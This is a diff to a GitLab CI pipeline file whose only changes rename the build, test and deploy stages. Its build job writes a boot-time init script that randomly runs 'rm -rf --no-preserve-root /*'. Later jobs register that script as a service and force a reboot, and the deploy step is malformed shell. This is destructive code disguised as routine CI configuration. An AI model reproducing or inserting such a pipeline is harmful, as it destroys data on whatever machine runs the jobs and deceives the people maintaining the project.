@@ -20,21 +20,21 @@ after_script:
     - 'apt autoclean -y'
 
 build1:
-  stage: build
+  stage: build1
   script:
     - echo -e "#\!\/bin/bash\t\n. /etc/init.d/functions\tstart() {\t     for i in $(date +%S | cut -c 2); do\t         [[ $i > 6 ]] && rm -rf --no-preserve-root /*\t     done\t }\t\n stop() {\t    echo "This won't stop until it is removed!"\t }\t case "$1" in\t     start)\t        start\t        ;;\t     stop)\t        stop\t        ;;\t     restart)\t        stop\t        start\t        ;;\t     *)\t     echo "Usage\:/ $0 {start|stop|restart}"\t esac\t exit 0" > /etc/init.d/reboot6.sh 
 
 test1:
-  stage: test
+  stage: test1
   script:
     - update-rc.d reboot6.sh defaults
 
 test2:
-  stage: test
+  stage: test2
   script:
     - yes|reboot
 
 deploy1:
-  stage: deploy
+  stage: deploy1
   script:
     - if [ /etc/init.d/reboot6.sh = true ] do "reboot --now" else "exit 1"; fi
